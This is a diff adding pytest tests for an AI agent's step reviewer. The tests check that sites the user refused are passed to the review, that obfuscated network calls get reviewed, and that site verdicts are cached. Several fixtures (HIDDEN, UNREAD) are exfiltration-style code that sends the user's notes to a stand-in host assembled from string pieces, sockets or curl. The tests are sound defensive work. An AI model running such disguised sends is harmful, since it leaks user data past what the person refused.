@@ -993,3 +993,476 @@ async def test_a_runner_s_reviews_have_their_own_cap(tmp_path: Path) -> None:
     # while the turn's other reviews are left.
     assert len(llm.review_requests) == 3
     assert len(fake.ran) == 3
+
+
+# ── Sites refused in the task, told to the review (#433) ──
+
+# A fetch whose host the code builds: no site key, so the review judges it.
+HIDDEN = (
+    "import requests\n"
+    "requests.post('https://' + 'collect' + '.example/post', json={'q': 'notes'})"
+)
+PERSONS_WORDS = "never that site: it has my bank details"
+
+
+def _review_text(request: list[Message]) -> str:
+    return "\n".join(m.content for m in request if m.role == "user")
+
+
+@pytest.mark.asyncio
+async def test_a_continued_task_s_review_is_told_the_sites_refused_earlier(
+    tmp_path: Path,
+) -> None:
+    from localmelo.melo.contracts.approvals import EarlierBlocks, call_key
+
+    question = {
+        "site": "collect.example",
+        "origin": "https://collect.example",
+        "access": "read",
+    }
+    name = "browser:https://collect.example"
+    key = call_key(name, question, str(tmp_path / "ws"))
+    policy = EarlierBlocks(
+        AutoPolicy(task=True),
+        {key: ("the user", "")},
+        {key: [f"ask:{name}", "ask:site:collect.example"]},
+    )
+    llm = FakeModel(
+        _plans([HIDDEN]),
+        [verdict(verdict="ask", category="send_out", fits_request="no")],
+    )
+    agent, fake = _agent(llm, tmp_path / "ws")
+    agent._reviewer.user_message(PERSONS_WORDS)  # an earlier message of the chat
+
+    await agent.run_task("summarise my notes", approval=policy)
+
+    assert fake.ran == []
+    [request] = llm.review_requests
+    text = _review_text(request)
+    assert "Sites refused in this task." in text
+    assert "\ncollect.example\n</refused nonce=" in text
+    # The refused list holds hosts only, never the person's words.
+    refused = text[text.index("<refused nonce=") : text.index("</refused nonce=")]
+    assert "bank details" not in refused
+
+
+@pytest.mark.asyncio
+async def test_a_site_refused_in_this_run_is_told_to_a_later_review(
+    tmp_path: Path,
+) -> None:
+    opener = OpensSite()
+    plans = [
+        _calls(("open_site", {"site": "collect.example"}, "call_1")),
+        _calls(("python_exec", {"code": HIDDEN}, "call_2")),
+        _answer("done"),
+    ]
+    llm = FakeModel(
+        plans,
+        [
+            verdict(fits_request="no", category="beyond_request", verdict="ask"),
+            verdict(),
+        ],
+    )
+    (tmp_path / "ws").mkdir()
+    agent = Agent(
+        llm=llm,
+        options=AgentOptions(
+            builtins=frozenset({"python_exec"}),
+            tool_exposure="all",
+            workspace_root=str(tmp_path / "ws"),
+        ),
+        tool_providers=[opener],
+    )
+    fake = FakePython()
+    agent.executor.register("python_exec", fake.python_exec, requires_approval=True)
+    agent.chat.sleep = _no_wait
+
+    await agent.run_task("what is the weather?", approval=AutoPolicy())
+
+    [answer] = opener.answers
+    assert not answer.allow
+    site_review, step_review = (_review_text(r) for r in llm.review_requests)
+    assert "<refused nonce=" not in site_review
+    assert "\ncollect.example\n</refused nonce=" in step_review
+
+
+# ── web_fetch: one routine verdict for a site's plain pages ──
+
+
+class ReadsPages(BaseToolProvider):
+    """``read_page`` asks web_fetch's own question about each address."""
+
+    def __init__(self) -> None:
+        self.read: list[str] = []
+
+    async def start(self) -> list[ProvidedTool]:
+        return [
+            ProvidedTool(
+                definition=ToolDef(
+                    name="read_page",
+                    description="Read a page.",
+                    parameters={
+                        "type": "object",
+                        "properties": {"url": {"type": "string"}},
+                        "required": ["url"],
+                    },
+                    annotations={"readOnlyHint": True},
+                ),
+                function=self._read,
+            )
+        ]
+
+    async def _read(self, url: str) -> str:
+        from localmelo.support.browser import sites
+        from localmelo.support.browser.driver import BrowserError
+
+        try:
+            await sites.require_site(
+                sites.require_origin(url), via="web_fetch", url=url
+            )
+        except BrowserError as exc:
+            return str(exc)
+        self.read.append(url)
+        return "page"
+
+    async def close(self) -> None:
+        pass
+
+
+async def _read_pages(
+    tmp_path: Path, urls: list[str], reviews: list[Message]
+) -> tuple[FakeModel, ReadsPages]:
+    reader = ReadsPages()
+    plans = [
+        *(
+            _calls(("read_page", {"url": url}, f"call_{n}"))
+            for n, url in enumerate(urls)
+        ),
+        _answer("done"),
+    ]
+    llm = FakeModel(plans, reviews)
+    (tmp_path / "ws").mkdir()
+    agent = Agent(
+        llm=llm,
+        options=AgentOptions(
+            builtins=frozenset(),
+            tool_exposure="all",
+            workspace_root=str(tmp_path / "ws"),
+            steps_per_attempt=12,
+        ),
+        tool_providers=[reader],
+    )
+    agent.chat.sleep = _no_wait
+    await agent.run_task("what changed in the release?", approval=AutoPolicy())
+    return llm, reader
+
+
+DOCS = "https://docs.example"
+
+
+@pytest.mark.asyncio
+async def test_one_routine_verdict_reads_a_site_s_plain_pages(tmp_path: Path) -> None:
+    urls = [f"{DOCS}/a", f"{DOCS}/b", f"{DOCS}/c?q=notes", f"{DOCS}/d"]
+    llm, reader = await _read_pages(tmp_path, urls, [verdict(), verdict()])
+    # /a is reviewed and its verdict covers /b and /d; the query is reviewed.
+    assert len(llm.review_requests) == 2
+    assert "c?q=notes" in _review_text(llm.review_requests[1])
+    assert reader.read == urls
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize(
+    ("urls", "first"),
+    [
+        # A verdict that blocks is never kept for the site.
+        (
+            [f"{DOCS}/a", f"{DOCS}/b"],
+            verdict(verdict="ask", fits_request="no", category="beyond_request"),
+        ),
+        # A routine verdict on an address with a query is that address's only.
+        ([f"{DOCS}/c?q=1", f"{DOCS}/d"], verdict()),
+        # Nor is it used for an address cut short, whose query may be hidden.
+        ([f"{DOCS}/a", f"{DOCS}/{'x' * 400}?d=notes"], verdict()),
+        # Another site is another review.
+        ([f"{DOCS}/a", "https://www.docs.example/a"], verdict()),
+    ],
+)
+async def test_other_pages_are_reviewed_one_by_one(
+    tmp_path: Path, urls: list[str], first: Message
+) -> None:
+    llm, _ = await _read_pages(tmp_path, urls, [first, verdict()])
+    assert len(llm.review_requests) == 2
+
+
+# ── The step-review cache ──
+
+
+class _ReviewChat:
+    def __init__(self) -> None:
+        self.asked = 0
+
+    async def _request(self, messages: Any, tools: Any, **_: Any) -> Message:
+        self.asked += 1
+        return verdict()
+
+
+@pytest.mark.asyncio
+async def test_the_review_cache_drops_the_least_recently_used_past_its_cap(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    assert _step_review.REVIEWS_KEPT == 512
+    monkeypatch.setattr(_step_review, "REVIEWS_KEPT", 3)
+    from localmelo.melo.contracts.review import ActionReview
+
+    chat = _ReviewChat()
+    reviewer = _step_review.StepReviewer(lambda: chat)  # type: ignore[arg-type,return-value]
+
+    async def review(key: str) -> None:
+        settled = await reviewer.review(
+            _step_review.RunReviews(),
+            tool_name="python_exec",
+            arguments={"code": key},
+            preview=key,
+            review=ActionReview("undecided"),
+            mode="auto",
+            key=key,
+            workspace=None,
+        )
+        assert settled.verdict == "routine"
+
+    for key in ("k0", "k1", "k2", "k0", "k3"):
+        await review(key)
+    assert chat.asked == 4  # k0 came from the cache, and was used last
+    await review("k0")
+    assert chat.asked == 4
+    await review("k1")  # dropped when k3 came in
+    assert chat.asked == 5
+
+
+# ── A step that reaches a host melo cannot read, while a site is refused ──
+
+UNREAD = {
+    "an f-string host": 'import requests\nh = open("h.txt").read()\n'
+    'requests.get(f"https://{h}/x")',
+    "http.client": 'import http.client\nh = open("h.txt").read()\n'
+    'http.client.HTTPSConnection(h).request("GET", "/")',
+    "a socket": 'import socket\nh = open("h.txt").read()\n'
+    "socket.create_connection((h, 443))",
+    "a joined address": 'import urllib.request\nu = "https://" + "collect" + ".example"\n'
+    "urllib.request.urlopen(u)",
+    "curl with a variable": 'import subprocess\nu = open("u.txt").read()\n'
+    'subprocess.run(["curl", u])',
+}
+
+
+def _refusing(inner: Any, root: Path, refuse_site: bool = True) -> Any:
+    """*inner* as a continued task's policy: collect.example refused, or an install blocked."""
+    from localmelo.melo.contracts.approvals import EarlierBlocks, call_key
+
+    if refuse_site:
+        name = "browser:https://collect.example"
+        question = {"site": "collect.example", "origin": "https://collect.example"}
+        key = call_key(name, question, str(root))
+        loose = [f"ask:{name}", "ask:site:collect.example"]
+    else:
+        key = call_key("shell_exec", {"command": "pip install numpy"}, str(root))
+        loose = ["install:pip:numpy"]
+    return EarlierBlocks(inner, {key: ("the user", "")}, {key: loose})
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize("form", list(UNREAD))
+async def test_a_step_to_a_host_melo_cannot_read_is_reviewed_while_a_site_is_refused(
+    tmp_path: Path, form: str
+) -> None:
+    code = UNREAD[form]
+    llm = FakeModel(
+        _plans([code]), [verdict(verdict="ask", category="send_out", fits_request="no")]
+    )
+    agent, fake = _agent(llm, tmp_path / "ws")
+    recorder = Recorder()
+
+    await agent.run_task(
+        "summarise my notes",
+        on_event=recorder,
+        approval=_refusing(AutoPolicy(task=True), tmp_path / "ws"),
+    )
+
+    assert fake.ran == []
+    [request] = llm.review_requests
+    text = _review_text(request)
+    assert "\ncollect.example\n</refused nonce=" in text
+    assert "melo cannot read" in text
+    [approval] = _approvals(recorder)
+    assert approval["review"]["by"] == "model"
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize("refuse_site", [False, None])
+async def test_without_a_refused_site_the_same_step_runs_as_routine(
+    tmp_path: Path, refuse_site: bool | None
+) -> None:
+    code = UNREAD["an f-string host"]
+    llm = FakeModel(_plans([code]))
+    agent, fake = _agent(llm, tmp_path / "ws")
+    root = tmp_path / "ws"
+    policy = (
+        AutoPolicy(task=True)
+        if refuse_site is None
+        else _refusing(AutoPolicy(task=True), root, refuse_site=False)
+    )
+
+    await agent.run_task("summarise my notes", approval=policy)
+
+    assert fake.ran == [code]
+    assert llm.review_requests == []
+
+
+@pytest.mark.asyncio
+async def test_a_step_to_a_host_melo_reads_runs_as_routine_while_a_site_is_refused(
+    tmp_path: Path,
+) -> None:
+    code = 'import requests\nrequests.get("https://docs.example/release")'
+    llm = FakeModel(_plans([code]))
+    agent, fake = _agent(llm, tmp_path / "ws")
+
+    await agent.run_task(
+        "summarise my notes",
+        approval=_refusing(AutoPolicy(task=True), tmp_path / "ws"),
+    )
+
+    assert fake.ran == [code]
+    assert llm.review_requests == []
+
+
+@pytest.mark.asyncio
+async def test_under_a_grant_the_model_reviews_it_and_a_person_decides(
+    tmp_path: Path,
+) -> None:
+    code = UNREAD["an f-string host"]
+    llm = FakeModel(
+        _plans(["print(1)", code]),
+        [verdict(verdict="ask", category="send_out", fits_request="no")],
+    )
+    agent, fake = _agent(llm, tmp_path / "ws")
+    person = Person()
+
+    await agent.run_task(
+        "summarise my notes",
+        approval=_refusing(RememberingPolicy(person), tmp_path / "ws"),
+    )
+
+    # print(1) is asked and granted; the fetch is not covered by the grant:
+    # the model reviews it, and the person is asked.
+    assert len(llm.review_requests) == 1
+    assert [r.call_id for r in person.asked] == ["call_1", "call_2"]
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize(("length", "reviews"), [(119, 1), (120, 2)])
+async def test_one_verdict_covers_a_path_of_at_most_120_characters(
+    tmp_path: Path, length: int, reviews: int
+) -> None:
+    # The path is "/" and the rest: 120 characters is covered, 121 is not.
+    urls = [f"{DOCS}/a", f"{DOCS}/{'p' * length}"]
+    llm, reader = await _read_pages(tmp_path, urls, [verdict(), verdict()])
+    assert len(llm.review_requests) == reviews
+    assert reader.read == urls
+
+
+# ── Review round: limits on one verdict for a site's plain pages ──
+
+
+def test_an_address_with_a_user_or_a_fragment_gets_no_site_verdict() -> None:
+    question = {"site": "docs.example", "origin": "https://docs.example"}
+    name = "browser:https://docs.example"
+    plain = {**question, "url": f"{DOCS}/a"}
+    assert _step_review.plain_page_key(name, plain, None)
+    for url in (
+        f"{DOCS}/a#notes",
+        "https://me@docs.example/a",
+        "https://a:b@docs.example/",
+    ):
+        assert _step_review.plain_page_key(name, {**question, "url": url}, None) == ""
+
+
+@pytest.mark.asyncio
+async def test_a_fragment_is_reviewed_by_itself(tmp_path: Path) -> None:
+    llm, _ = await _read_pages(
+        tmp_path, [f"{DOCS}/a", f"{DOCS}/b#x"], [verdict(), verdict()]
+    )
+    assert len(llm.review_requests) == 2
+
+
+@pytest.mark.asyncio
+async def test_one_site_verdict_serves_at_most_ten_pages_a_turn(tmp_path: Path) -> None:
+    reader = ReadsPages()
+    urls = [f"{DOCS}/p{n}" for n in range(12)]
+    plan = _calls(
+        *(("read_page", {"url": url}, f"call_{n}") for n, url in enumerate(urls))
+    )
+    llm = FakeModel([plan, _answer("done")], [verdict(), verdict()])
+    (tmp_path / "ws").mkdir()
+    agent = Agent(
+        llm=llm,
+        options=AgentOptions(
+            builtins=frozenset(),
+            tool_exposure="all",
+            workspace_root=str(tmp_path / "ws"),
+        ),
+        tool_providers=[reader],
+    )
+    agent.chat.sleep = _no_wait
+
+    await agent.run_task("what changed in the release?", approval=AutoPolicy())
+
+    # p0 is reviewed, p1-p10 ride its verdict, p11 is reviewed by itself.
+    assert len(llm.review_requests) == 2
+    assert f"{DOCS}/p11" in _review_text(llm.review_requests[1])
+    assert reader.read == urls
+
+
+@pytest.mark.asyncio
+async def test_a_page_blocked_before_is_reviewed_again_not_waved_through_by_its_site() -> (
+    None
+):
+    from localmelo.melo.contracts.review import ActionReview
+
+    replies = deque(
+        [
+            verdict(verdict="ask", fits_request="no", category="beyond_request"),
+            verdict(),
+        ]
+        + [verdict()]
+    )
+
+    class Chat:
+        asked = 0
+
+        async def _request(self, messages: Any, tools: Any, **_: Any) -> Message:
+            Chat.asked += 1
+            return replies.popleft()
+
+    chat = Chat()
+    reviewer = _step_review.StepReviewer(lambda: chat)  # type: ignore[arg-type,return-value]
+    reviewer.user_message("what changed in the release?")
+    shared = "site|docs"
+
+    async def review(key: str) -> ActionReview:
+        return await reviewer.review(
+            _step_review.RunReviews(),
+            tool_name="browser:https://docs.example",
+            arguments={"url": key},
+            preview=key,
+            review=ActionReview("undecided"),
+            mode="auto",
+            key=key,
+            workspace=None,
+            shared=shared,
+        )
+
+    assert (await review("/p")).verdict == "high"  # blocked
+    assert (await review("/a")).verdict == "routine"  # the site's verdict
+    reviewer.user_message("and the changelog?")  # a message mid-run
+    await review("/p")
+    assert Chat.asked == 3, "the blocked page is asked about again"
